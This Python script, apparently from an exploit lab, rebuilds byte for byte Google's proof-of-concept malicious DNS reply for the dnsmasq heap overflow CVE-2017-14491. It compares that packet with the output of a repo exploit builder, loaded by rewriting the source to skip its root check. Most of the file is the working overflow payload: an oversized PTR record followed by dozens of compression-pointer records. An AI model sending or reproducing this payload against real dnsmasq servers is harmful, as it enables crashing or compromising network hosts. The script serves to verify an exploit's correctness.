#!/usr/bin/env python3
"""Byte-compare the repo's builder against Google's reference, reconstructed
EXACTLY as written in their PoC (16 explicit label groups, not a *16 shorthand).
"""
import pathlib, struct, sys

LAB = pathlib.Path(__file__).resolve().parent
REPO = LAB.parent

def dw(x):
    return struct.pack('>H', x)

tid = 0x1234

# ---- Google reference: transcribed literally from CVE-2017-14491.py ----
d = b''
d += dw(tid)
d += dw(0x85a0)
d += dw(1)
d += dw(0x52)
d += dw(0)
d += dw(0)
d += (b'\x03125\x018\x018\x018\x07in-addr\x04arpa\x00' + b'\x00\x0c' + b'\x00\x01')
d += (b'\xc0\x0c' + b'\x00\x0c' + b'\x00\x01' + b'\x00\x00\x00\x3d' + b'\x04\x00'
      + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62
      + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62
      + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62
      + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62 + b'\x3e' + b'Z'*62
      + b'\x0e' + b'Z'*14 + b'\x00')
d += (b'\xc0\x0c' + b'\x00\x0c' + b'\x00\x01' + b'\x00\x00\x00\x3d' + b'\x00\x26'
      + b'\x08DCBBEEEE\x04DDDD\x08CCCCCCCC\x04AAAA\x04BBBB\x03com\x00')
for _ in range(79):
    d += (b'\xc0\x0c' + b'\x00\x0c' + b'\x00\x01' + b'\x00\x00\x00\x3d' + b'\x00\x02' + b'\xc4\x40')
d += (b'\xc0\x0c' + b'\x00\x0c' + b'\x00\x01' + b'\x00\x00\x00\x3d' + b'\x00\x11'
      + b'\x04EEEE\x09DAABBEEEE\xc4\x49')

# ---- repo builder ----
src = (REPO / "masq_overflow.py").read_text().replace("if os.geteuid() != 0:", "if False:")
frag = src[:src.index("# GLOBAL CONFIG")] + src[src.index("def dw(x)"):src.index("def exploit_cve_2017_14491(")]
ns = {}
exec(compile(frag, "frag", "exec"), ns)
mine = ns["build_cve_2017_14491_reply"](tid)

print("Google len:", len(d))
print("Repo   len:", len(mine))
print("EQUAL:", d == mine)
if d != mine:
    for i, (a, b) in enumerate(zip(d, mine)):
        if a != b:
            print(f"first diff @ {i}: google=0x{a:02x} repo=0x{b:02x}")
            print("google ctx:", d[max(0,i-8):i+8])
            print("repo   ctx:", mine[max(0,i-8):i+8])
            break
sys.exit(0 if d == mine else 1)
